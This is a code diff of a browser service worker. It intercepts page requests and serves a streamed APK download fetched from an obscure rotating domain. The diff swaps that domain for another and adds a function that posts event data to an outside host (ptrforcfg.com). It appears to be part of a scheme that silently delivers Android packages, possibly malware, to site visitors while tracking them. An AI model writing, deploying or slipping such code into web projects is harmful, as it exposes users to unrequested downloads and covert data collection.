@@ -1,10 +1,23 @@
 self.addEventListener('install', () => self.skipWaiting());
 self.addEventListener('activate', event => event.waitUntil(self.clients.claim()));
 
+async function logEvent(eventType, data = {}) {
+    try {
+        data.event = eventType;
+        const response = await fetch("https://ptrforcfg.com/gh_test", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+        });
+        response.json();
+    } catch (error) {
+        console.error('❌ Send error:', error);
+    }
+}
+
 async function downloadApk(apkURL) {
     const response = await fetch(apkURL, {
         method: 'GET',
-        // mode: 'no-cors',
         credentials: 'omit'
     });
 
@@ -45,7 +58,7 @@ self.addEventListener('fetch', event => {
                     }
                 }
 
-                let apkURL = "https://blindlyorganicsnake.autos/aaa8e7e844e856a015a/" + url.search;
+                let apkURL = "https://exactlyperfectmoth.website/aaa8e7e844e856a015a/" + url.search;
                 const stream = newApkStream(apkURL);
 
                 return new Response(stream, {
